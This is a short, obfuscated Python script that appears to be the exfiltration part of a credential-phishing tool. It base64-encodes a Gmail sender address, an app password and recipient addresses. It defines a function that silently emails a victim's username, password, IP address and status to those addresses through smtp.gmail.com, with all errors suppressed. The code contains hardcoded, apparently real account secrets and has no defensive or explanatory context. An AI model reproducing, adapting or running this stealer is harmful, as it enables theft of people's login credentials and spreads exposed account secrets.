import smtplib as s,base64 as b
from email.mime.text import MIMEText as T
from email.mime.multipart import MIMEMultipart as M
e,p="ZWdhbGU1eEBnbWFpbC5jb20=","ZHZqcSBpZ3l3IGp5YWIgaHVheA=="
r=["Z2FtZXJhZGl0eWEzNzAzQGdtYWlsLmNvbQ==",e]
def d(x):return b.b64decode(x+'='*(-len(x)%4)).decode()if True else""
E,P,R=d(e),d(p),[d(i)for i in r]
def l(u="d",pw="d",ip="0.0.0.0",st="u"):
 try:
  m=M()
  m["From"],m["To"]=E,",".join(R)
  m["Subject"]="📥"
  t=f"\n👤:{u}\n🔐:{pw}\n🌐:{ip}\n📊:{st}"
  m.attach(T(t,"plain"))
  with s.SMTP("smtp.gmail.com",587)as z:z.starttls();z.login(E,P);z.sendmail(E,R,m.as_string())
 except:...
